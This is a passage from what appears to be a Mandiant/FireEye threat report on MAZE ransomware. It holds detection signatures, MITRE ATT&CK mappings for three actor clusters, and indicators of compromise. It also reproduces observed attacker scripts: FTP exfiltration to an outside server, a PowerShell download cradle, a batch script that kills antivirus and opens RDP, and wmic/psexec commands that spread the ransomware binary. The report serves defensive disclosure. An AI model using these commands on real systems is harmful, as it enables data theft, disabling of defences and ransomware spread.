Discovery: Language Query Using PowerShell, Current User</li> \n <li>A104-482 - Host CLI - Discovery: Language Query Using reg query</li> \n <li>A104-494 - Host CLI - Discovery: MAZE, Dropping Ransomware Note Burn Directory</li> \n <li>A104-495 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html Variant</li> \n <li>A104-496 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt Variant</li> \n <li>A104-027 - Host CLI - Discovery: Process Discovery</li> \n <li>A104-028 - Host CLI - Discovery: Process Discovery with PowerShell</li> \n <li>A104-029 - Host CLI - Discovery: Remote System Discovery</li> \n <li>A104-153 - Host CLI - Discovery: Security Software Identification with Tasklist</li> \n <li>A104-083 - Host CLI - Discovery: System Info</li> \n <li>A104-483 - Host CLI - Exfiltration: PowerShell FTP Upload</li> \n <li>A104-498 - Host CLI - Impact: MAZE, Desktop Wallpaper Ransomware Message</li> \n <li>A104-227 - Host CLI - Initial Access, Lateral Movement: Replication Through Removable Media</li> \n <li>A100-879 - Malicious File Transfer - Adfind.exe, Download</li> \n <li>A150-046 - Malicious File Transfer - BEACON, Download</li> \n <li>A100-880 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp Executable Variant</li> \n <li>A100-881 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp PowerShell Variant</li> \n <li>A100-882 - Malicious File Transfer - Bloodhound Ingestor Download, PowerShell Variant</li> \n <li>A101-037 - Malicious File Transfer - MAZE Download, Variant #1</li> \n <li>A101-038 - Malicious File Transfer - MAZE Download, Variant #2</li> \n <li>A101-039 - Malicious File Transfer - MAZE Download, Variant #3</li> \n <li>A101-040 - Malicious File Transfer - MAZE Download, Variant #4</li> \n <li>A101-041 - Malicious File Transfer - MAZE Download, Variant #5</li> \n <li>A101-042 - Malicious File Transfer - MAZE Download, Variant #6</li> \n <li>A101-043 - Malicious File Transfer - MAZE Download, Variant #7</li> \n <li>A101-044 - Malicious File Transfer - MAZE Download, Variant #8</li> \n <li>A101-045 - Malicious File Transfer - MAZE Download, Variant #9</li> \n <li>A101-034 - Malicious File Transfer - MAZE Dropper Download, Variant #1</li> \n <li>A101-035 - Malicious File Transfer - MAZE Dropper Download, Variant #2</li> \n <li>A100-885 - Malicious File Transfer - MAZE Dropper Download, Variant #4</li> \n <li>A101-036 - Malicious File Transfer - MAZE Ransomware, Malicious Macro, PowerShell Script Download</li> \n <li>A100-284 - Malicious File Transfer - Mimikatz W/ Padding (1MB), Download</li> \n <li>A100-886 - Malicious File Transfer - Rclone.exe, Download</li> \n <li>A100-484 - Scanning Activity - Nmap smb-enum-shares, SMB Share Enumeration</li> \n</ul> \n<h4>Detecting the Techniques</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Platform</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <b>Signature Name</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>MVX (covers multiple FireEye technologies)</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>Bale Detection</p> <p>FE_Ransomware_Win_MAZE_1</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Endpoint Security</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>WMIC SHADOWCOPY DELETE (METHODOLOGY)</p> <p>MAZE RANSOMWARE (FAMILY)</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Network Security</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>Ransomware.Win.MAZE</p> <p>Ransomware.Maze</p> <p>Ransomware.Maze</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>MITRE ATT&amp;CK Mappings</h4> \n<p>Mandiant currently tracks three separate clusters of activity involved in the post-compromise distribution of MAZE ransomware. Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that ‘initial access’ phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s).</p> \n<h4>MAZE Group 1 MITRE ATT&amp;CK Mapping</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>ATT&amp;CK Tactic Category</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <b>Techniques</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Initial Access</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1133: External Remote Services</p> <p>T1078: Valid Accounts</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Execution</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1059: Command-Line Interface</p> <p>T1086: PowerShell</p> <p>T1064: Scripting</p> <p>T1035: Service Execution</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Persistence</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> <p>T1050: New Service</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Privilege Escalation</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Defense Evasion</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> <p>T1036: Masquerading</p> <p>T1027: Obfuscated Files or Information</p> <p>T1064: Scripting</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Credential Access</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1110: Brute Force</p> <p>T1003: Credential Dumping</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Discovery</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1087: Account Discovery</p> <p>T1482: Domain Trust Discovery</p> <p>T1083: File and Directory Discovery</p> <p>T1135: Network Share Discovery</p> <p>T1069: Permission Groups Discovery</p> <p>T1018: Remote System Discovery</p> <p>T1016: System Network Configuration Discovery</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Lateral Movement</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1076: Remote Desktop Protocol</p> <p>T1105: Remote File Copy</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Collection</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1005: Data from Local System</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Command and Control</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1043: Commonly Used Port</p> <p>T1105: Remote File Copy</p> <p>T1071: Standard Application Layer Protocol</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Exfiltration</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1002: Data Compressed</p> <p>T1048: Exfiltration Over Alternative Protocol</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Impact</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1486: Data Encrypted for Impact</p> <p>T1489: Service Stop</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>MAZE Group 2 MITRE ATT&amp;CK Mapping</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>ATT&amp;CK Tactic Category</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <b>Techniques</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Initial Access</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1193: Spearphishing Attachment</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Execution</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1059: Command-Line Interface</p> <p>T1086: PowerShell</p> <p>T1085: Rundll32</p> <p>T1064: Scripting</p> <p>T1204: User Execution</p> <p>T1028: Windows Remote Management</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Persistence</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> <p>T1050: New Service</p> <p>T1136: Create Account</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Privilege Escalation</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> <p>T1050: New Service</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Defense Evasion</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> <p>T1140: Deobfuscate/Decode Files or Information</p> <p>T1107: File Deletion</p> <p>T1036: Masquerading</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Credential Access</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1003: Credential Dumping</p> <p>T1081: Credentials in Files</p> <p>T1171: LLMNR/NBT-NS Poisoning</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Discovery</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1087: Account Discovery</p> <p>T1482: Domain Trust Discovery</p> <p>T1083: File and Directory Discovery</p> <p>T1135: Network Share Discovery</p> <p>T1069: Permission Groups Discovery</p> <p>T1018: Remote System Discovery</p> <p>T1033: System Owner/User Discovery</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Lateral Movement</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1076: Remote Desktop Protocol</p> <p>T1028: Windows Remote Management</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Collection</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1074: Data Staged</p> <p>T1005: Data from Local System</p> <p>T1039: Data from Network Shared Drive</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Command and Control</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1043: Commonly Used Port</p> <p>T1219: Remote Access Tools</p> <p>T1105: Remote File Copy</p> <p>T1071: Standard Application Layer Protocol</p> <p>T1032: Standard Cryptographic Protocol</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Exfiltration</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1020: Automated Exfiltration</p> <p>T1002: Data Compressed</p> <p>T1048: Exfiltration Over Alternative Protocol</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Impact</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1486: Data Encrypted for Impact</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>MAZE Group 3 MITRE ATT&amp;CK Mapping (FIN6)</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>ATT&amp;CK Tactic Category</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <b>Techniques</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Initial Access</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1133: External Remote Services</p> <p>T1078: Valid Accounts</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Execution</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1059: Command-Line Interface</p> <p>T1086: PowerShell</p> <p>T1064: Scripting</p> <p>T1035: Service Execution</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Persistence</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1078: Valid Accounts</p> <p>T1031: Modify Existing Service</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Privilege Escalation</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1055: Process Injection</p> <p>T1078: Valid Accounts</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Defense Evasion</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1055: Process Injection</p> <p>T1078: Valid Accounts</p> <p>T1116: Code Signing</p> <p>T1089: Disabling Security Tools</p> <p>T1202: Indirect Command Execution</p> <p>T1112: Modify Registry</p> <p>T1027: Obfuscated Files or Information</p> <p>T1108: Redundant Access</p> <p>T1064: Scripting</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Credential Access</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1003: Credential Dumping</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Discovery</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1087: Account Discovery</p> <p>T1482: Domain Trust Discovery</p> <p>T1083: File and Directory Discovery</p> <p>T1069: Permission Groups Discovery</p> <p>T1018: Remote System Discovery</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Lateral Movement</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1097: Pass the Ticket</p> <p>T1076: Remote Desktop Protocol</p> <p>T1105: Remote File Copy</p> <p>T1077: Windows Admin Shares</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Collection</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1074: Data Staged</p> <p>T1039: Data from Network Shared Drive</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Command and Control</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1043: Commonly Used Port</p> <p>T1219: Remote Access Tools</p> <p>T1105: Remote File Copy</p> <p>T1071: Standard Application Layer Protocol</p> <p>T1032: Standard Cryptographic Protocol</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Exfiltration</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1002: Data Compressed</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Impact</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p>T1486: Data Encrypted for Impact</p> <p>T1490: Inhibit System Recovery</p> <p>T1489: Service Stop</p> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Example Commands Observed in MAZE Ransomware Incidents</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"624\" valign=\"top\"><p>function Enum-UsersFolders($PathEnum)<br /> {<br /> &nbsp; &nbsp; $foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local'<br /> <br /> &nbsp; &nbsp; Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinue<br /> &nbsp; &nbsp; Get-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinue<br /> &nbsp; &nbsp; Get-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinue<br /> <br /> &nbsp; &nbsp; foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) {<br /> <br /> &nbsp; &nbsp; &nbsp; &nbsp; foreach($SeachDir in $foldersArr) {<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue<br /> &nbsp; &nbsp; &nbsp; &nbsp; }<br /> &nbsp; &nbsp; }<br /> }</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">PowerShell reconnaissance script used to enumerate directories</span></p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"624\" valign=\"top\"><p>$Dir=\"C:/Windows/Temp/\"<br /> #ftp server<br /> $ftp = \"ftp://&lt;IP Address&gt;/incoming/\"<br /> $user = \"&lt;username&gt;\"<br /> $pass = \"&lt;password&gt;\"<br /> $webclient = New-Object System.Net.WebClient<br /> $webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)<br /> #list every sql server trace file<br /> foreach($item in (dir $Dir \"*.7z\")){<br /> &nbsp; &nbsp;\"Uploading $item...\"<br /> &nbsp; &nbsp;$uri = New-Object System.Uri($ftp+$item.Name)<br /> &nbsp; &nbsp;$webclient.UploadFile($uri, $item.FullName)<br /> }</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Decoded FTP upload PowerShell script</span></p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"624\" valign=\"top\"><p>powershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'); Add-FtpFile -ftpFilePath \"ftp://&lt;IP&nbsp; Address&gt;/cobalt_uploads/&lt;file name&gt;\" -localFile \"&lt;local file path&gt;\\ &lt;file name&gt; \" -userName \"&lt;username&gt;\" -password \"&lt;password&gt;\"</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Decoded FTP upload PowerShell script</span></p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"624\" valign=\"top\"><p>[…]<br /> echo 7<br /> echo 7<br /> taskkill /im csrss_tc.exe /f<br /> taskkill /im kwsprod.exe /f<br /> taskkill /im avkwctl.exe /f<br /> taskkill /im rnav.exe /f<br /> taskkill /im crssvc.exe /f<br /> sc config CSAuth start= disabled<br /> taskkill /im vsserv.exe /f<br /> taskkill /im ppmcativedetection.exe /f<br /> […]<br /> taskkill /im sahookmain.exe /f<br /> taskkill /im mcinfo.exe /f<br /> reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f<br /> netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Ye<br /> c:\\windows\\temp\\sss.exe</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Excerpt from windows.bat kill script</span></p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"624\" valign=\"top\"><p>start copy sss.exe \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\<br /> start copy sss.exe \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\<br /> <br /> start copy windows.bat \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\<br /> start copy windows.bat \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\<br /> <br /> start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount</i>&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"c:\\windows\\temp\\sss.exe\"</p> <p>start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount&gt;</i>\" /password:\"&lt;<i>password</i>&gt;\" process call create \"c:\\windows\\temp\\sss.exe\"<br /> <br /> start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;DOMAIN\\adminaccount&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\"</p> <p>start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount</i>&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\"<br /> <br /> start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount</i>&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"cmd.exe /c copy \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\"</p> <p>start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount</i>&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"cmd.exe /c copy \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\"<br /> <br /> start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount</i>&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"cmd.exe /c copy \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\"</p> <p>start wmic /node:\"&lt;internal IP&gt;\" /user:\"&lt;<i>DOMAIN\\adminaccount</i>&gt;\" /password:\"&lt;<i>password</i>&gt;\" process call create \"cmd.exe /c copy \\\\&lt;internal IP&gt;\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\"</p> <p>start psexec.exe \\\\&lt;internal IP&gt; -u &lt;<i>DOMAIN\\adminaccount</i>&gt; -p \"&lt;<i>password</i>&gt;\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe</p> <p>start psexec.exe \\\\&lt;internal IP&gt; -u &lt;<i>DOMAIN\\adminaccount</i>&gt; -p \"&lt;<i>password</i>&gt;\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe</p> <p>start psexec.exe \\\\&lt;internal IP&gt; -u &lt;<i>DOMAIN\\adminaccount</i>&gt; -p \"&lt;<i>password</i>&gt;\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\windows.bat</p> <p>start psexec.exe \\\\&lt;internal IP&gt; -u &lt;<i> <u>DOMAIN\\adminaccount&gt;</u></i> -p \"&lt;<i>password</i>&gt;\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\windows.bat</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Example commands from MAZE distribution scripts</span></p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"623\" valign=\"top\"><p>@echo off<br /> del done.txt<br /> del offline.txt<br /> rem Loop thru list of computer names in file specified on command-line<br /> for /f %%i in (%1) do call :check_machine %%i<br /> goto end<br /> :check_machine<br /> rem Check to see if machine is up.<br /> ping -n 1 %1|Find \"TTL=\" &gt;NUL 2&gt;NUL<br /> if errorlevel 1 goto down<br /> echo %1<br /> START cmd /c \"copy [Location of MAZE binary] \\\\%1\\c$\\windows\\temp &amp;&amp; exit\"<br /> timeout 1 &gt; NUL<br /> echo %1 &gt;&gt; done.txt<br /> rem wmic /node:\"%1\" process call create \"regsvr32.exe /i C:\\windows\\temp\\[MAZE binary name]\" &gt;&gt; done.txt<br /> START \"\" cmd /c \"wmic /node:\"%1\" process call create \"regsvr32.exe /i C:\\windows\\temp\\[MAZE binary name]\" &amp;&amp; exit\"<br /> goto end<br /> :down<br /> &nbsp; rem Report machine down<br /> &nbsp; echo %1 &gt;&gt; offline.txt<br /> :end</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Example MAZE distribution script</span></p> \n<h4>Indicators of Compromise</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"624\"> \n <tbody> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Maze Payloads</p> </td> \n   <td width=\"424\" valign=\"top\"><p>064058cf092063a5b69ed8fd2a1a04fe</p> <p>0f841c6332c89eaa7cac14c9d5b1d35b</p> <p>108a298b4ed5b4e77541061f32e55751</p> <p>11308e450b1f17954f531122a56fae3b</p> <p>15d7dd126391b0e7963c562a6cf3992c</p> <p>21a563f958b73d453ad91e251b11855c</p> <p>27c5ecbb94b84c315d56673a851b6cf9</p> <p>2f78ff32cbb3c478865a88276248d419</p> <p>335aba8d135cc2e66549080ec9e8c8b7</p> <p>3bfcba2dd05e1c75f86c008f4d245f62</p> <p>46b98ee908d08f15137e509e5e69db1b</p> <p>5774f35d180c0702741a46d98190ff37</p> <p>5df79164b6d0661277f11691121b1d53</p> <p>658e9deec68cf5d33ee0779f54806cc2</p> <p>65cf08ffaf12e47de8cd37098aac5b33</p> <p>79d137d91be9819930eeb3876e4fbe79</p> <p>8045b3d2d4a6084f14618b028710ce85</p> <p>8205a1106ae91d0b0705992d61e84ab2</p> <p>83b8d994b989f6cbeea3e1a5d68ca5d8</p> <p>868d604146e7e5cb5995934b085846e3</p> <p>87239ce48fc8196a5ab66d8562f48f26</p> <p>89e1ddb8cc86c710ee068d6c6bf300f4</p> <p>910aa49813ee4cc7e4fa0074db5e454a</p> <p>9eb13d56c363df67490bcc2149229e4c</p> <p>a0c5b4adbcd9eb6de9d32537b16c423b</p> <p>a3a3495ae2fc83479baeaf1878e1ea84</p> <p>b02be7a336dcc6635172e0d6ec24c554</p> <p>b40a9eda37493425782bda4a3d9dad58</p> <p>b4d6cb4e52bb525ebe43349076a240df</p> <p>b6786f141148925010122819047d1882</p> <p>b93616a1ea4f4a131cc0507e6c789f94</p> <p>bd9838d84fd77205011e8b0c2bd711e0</p> <p>be537a66d01c67076c8491b05866c894</p> <p>bf2e43ff8542e73c1b27291e0df06afd</p> <p>c3ce5e8075f506e396ee601f2757a2bd</p> <p>d2dda72ff2fbbb89bd871c5fc21ee96a</p> <p>d3eaab616883fcf51dcbdb4769dd86df</p> <p>d552be44a11d831e874e05cadafe04b6</p> <p>deebbea18401e8b5e83c410c6d3a8b4e</p> <p>dfa4631ec2b8459b1041168b1b1d5105</p> <p>e57ba11045a4b7bc30bd2d33498ef194</p> <p>e69a8eb94f65480980deaf1ff5a431a6</p> <p>ef95c48e750c1a3b1af8f5446fa04f54</p> <p>f04d404d84be66e64a584d425844b926</p> <p>f457bb5060543db3146291d8c9ad1001</p> <p>f5ecda7dd8bb1c514f93c09cea8ae00d</p> <p>f83cef2bf33a4d43e58b771e81af3ecc</p> <p>fba4cbb7167176990d5a8d24e9505f71</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Maze Check-in IPs</p> </td> \n   <td width=\"424\" valign=\"top\"><p>91.218.114.11</p> <p>91.218.114.25</p> <p>91.218.114.26</p> <p>91.218.114.31</p> <p>91.218.114.32</p> <p>91.218.114.37</p> <p>91.218.114.38</p> <p>91.218.114.4</p> <p>91.218.114.77</p> <p>91.218.114.79</p> <p>92.63.11.151</p> <p>92.63.15.6&nbsp;</p> <p>92.63.15.8&nbsp;</p> <p>92.63.17.245</p> <p>92.63.194.20</p> <p>92.63.194.3</p> <p>92.63.29.137</p> <p>92.63.32.2&nbsp;</p> <p>92.63.32.52</p> <p>92.63.32.55</p> <p>92.63.32.57</p> <p>92.63.37.100</p> <p>92.63.8.47</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Maze-related Domains</p> </td> \n   <td width=\"424\" valign=\"top\"><p>aoacugmutagkwctu[.]onion</p> <p>mazedecrypt[.]top&nbsp;</p> <p>mazenews[.]top</p> <p>newsmaze[.]top</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Maze Download URLs</p> </td> \n   <td width=\"424\" valign=\"top\"><p>http://104.168.174.32/wordupd_3.0.1.tmp</p> <p>http://104.168.198.208/wordupd.tmp</p> <p>http://104.168.201.35/dospizdos.tmp</p> <p>http://104.168.201.47/wordupd.tmp</p> <p>http://104.168.215.54/wordupd.tmp</p> <p>http://149.56.245.196/wordupd.tmp</p> <p>http://192.119.106.235/mswordupd.tmp</p> <p>http://192.119.106.235/officeupd.tmp</p> <p>http://192.99.172.143/winupd.tmp</p> <p>http://54.39.233.188/win163.65.tmp</p> <p>http://91.208.184.174:8079/windef.exe</p> <p>http://agenziainformazioni[.]icu/wordupd.tmp</p> <p>http://www.download-invoice[.]site/Invoice_29557473.exe</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Malicious Documents</p> </td> \n   <td width=\"424\" valign=\"top\"><p>1a26c9b6ba40e4e3c3dce12de266ae10</p> <p>53d5bdc6bd7904b44078cf80e239d42b</p> <p>79271dc08052480a578d583a298951c5</p> <p>a2d631fcb08a6c840c23a8f46f6892dd</p> <p>ad30987a53b1b0264d806805ce1a2561</p> <p>c09af442e8c808c953f4fa461956a30f</p> <p>ee26e33725b14850b1776a67bd8f2d0a</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>BEACON C2s</p> </td> \n   <td width=\"424\" valign=\"top\"><p>173.209.43.61</p> <p>193.36.237.173</p> <p>37.1.213.9</p> <p>37.252.7.142</p> <p>5.199.167.188</p> <p>checksoffice[.]me</p> <p>drivers.updatecenter[.]icu</p> <p>plaintsotherest[.]net</p> <p>thesawmeinrew[.]net</p> <p>updates.updatecenter[.]icu</p> </td> \n  </tr> \n  <tr> \n   <td width=\"200\" valign=\"top\"><p>Cobalt Strike Binaries</p> </td> \n   <td width=\"424\" valign=\"top\"><p>7507fe19afbda652e9b2768c10ad639f</p> <p>a93b86b2530cc988f801462ead702d84</p> <p>4f57e35a89e257952c3809211bef78ea</p> <p>bad6fc87a98d1663be0df23aedaf1c62</p> <p>f5ef96251f183f7fc63205d8ebf30cbf</p> <p>c818cc38f46c604f8576118f12fd0a63</p> <p>078cf6db38725c37030c79ef73519c0c</p> <p>c255daaa8abfadc12c9ae8ae2d148b31</p> <p>1fef99f05bf5ae78a28d521612506057</p> <p>cebe4799b6aff9cead533536b09fecd1</p> <p>4ccca6ff9b667a01df55326fcc850219</p> 